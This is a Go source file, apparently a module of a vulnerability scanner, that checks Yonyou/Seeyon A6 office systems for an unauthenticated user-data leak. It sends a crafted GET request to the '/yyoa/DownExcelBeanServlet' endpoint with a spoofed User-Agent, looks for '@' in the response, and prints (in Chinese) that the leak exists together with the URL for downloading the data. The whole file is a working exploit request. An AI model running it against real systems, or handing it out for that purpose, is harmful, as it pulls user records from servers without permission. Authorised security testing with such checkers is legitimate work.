package A6_DownExcelBeanServlet

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	A6DownExcelBeanServlet 用户敏感信息泄露漏洞不存在")
		return
	}

	if resp.StatusCode == 200 && strings.Contains(resp.String(), "@") {
		color.Green.Println(url + "	A6 DownExcelBeanServlet 用户敏感信息泄露漏洞存在, 下载地址: " + vulnUrl)
	} else {
		color.Red.Println("[-]	A6DownExcelBeanServlet 用户敏感信息泄露漏洞不存在")
	}
}
